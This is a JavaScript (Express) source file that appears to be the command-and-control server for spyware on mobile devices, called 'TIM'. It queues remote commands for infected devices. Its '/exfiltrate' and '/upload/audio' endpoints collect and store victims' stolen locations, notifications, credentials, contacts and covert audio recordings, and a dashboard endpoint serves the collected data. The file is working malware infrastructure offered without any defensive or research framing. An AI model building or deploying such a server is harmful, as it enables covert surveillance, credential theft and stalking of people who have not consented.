const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.raw({ type: 'application/octet-stream', limit: '100mb' }));

// Verbose logging middleware
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});

const DATA_FILE = path.join(__dirname, 'data.json');
const UPLOADS_DIR = path.join(__dirname, 'uploads');

// Ensure uploads directory exists
if (!fs.existsSync(UPLOADS_DIR)) {
    fs.mkdirSync(UPLOADS_DIR);
}

// In-memory command queue
const commandQueue = {};

// Root route
app.get('/', (req, res) => {
    res.send('TIM Backend is operational. Use the dashboard at http://localhost:5173 to interact.');
});

// Ensure data file exists
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify({
        locations: [],
        notifications: [],
        credentials: [],
        logs: [],
        audioFiles: []
    }, null, 2));
}

function getData() {
    return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
}

function saveData(data) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// Endpoint for remote commands (Dashboard -> Backend)
app.post('/command/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    const { action } = req.body;

    if (!commandQueue[deviceId]) commandQueue[deviceId] = [];
    commandQueue[deviceId].push(action);

    console.log(`TIM: Command ${action} queued for device ${deviceId}`);
    res.json({ message: `TIM: Command ${action} queued for device ${deviceId}` });
});

// Endpoint for agent to poll for commands (Device -> Backend)
app.get('/commands/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    const commands = commandQueue[deviceId] || [];
    commandQueue[deviceId] = [];
    res.json({ commands });
});

// Endpoint for exfiltrated data (Device -> Backend)
app.post('/exfiltrate', (req, res) => {
    const { type, data, deviceId, timestamp } = req.body;
    console.log(`TIM: Received exfiltration [${type}] from ${deviceId}`);

    const db = getData();
    const entry = { deviceId, timestamp: timestamp || new Date().toISOString(), ...data };

    if (type === 'location') db.locations.push(entry);
    else if (type === 'notification') db.notifications.push(entry);
    else if (type === 'credentials') db.credentials.push(entry);
    else if (type === 'contacts') db.logs.push({ ...entry, type: 'contacts' });
    else db.logs.push(entry);

    saveData(db);
    res.status(200).send('OK');
});

// Endpoint for audio uploads
app.post('/upload/audio', (req, res) => {
    const deviceId = req.headers['x-device-id'] || 'unknown';
    console.log(`TIM: Received audio recording from ${deviceId}`);

    const fileName = `audio_${Date.now()}.m4a`;
    const filePath = path.join(UPLOADS_DIR, fileName);

    fs.writeFileSync(filePath, req.body);

    const db = getData();
    db.audioFiles.push({ deviceId, fileName, timestamp: new Date().toISOString() });
    saveData(db);

    res.status(200).send('OK');
});

// API for Dashboard to fetch all data
app.get('/api/data', (req, res) => {
    res.json(getData());
});

app.listen(3000, () => console.log('TIM Command Center running on port 3000'));
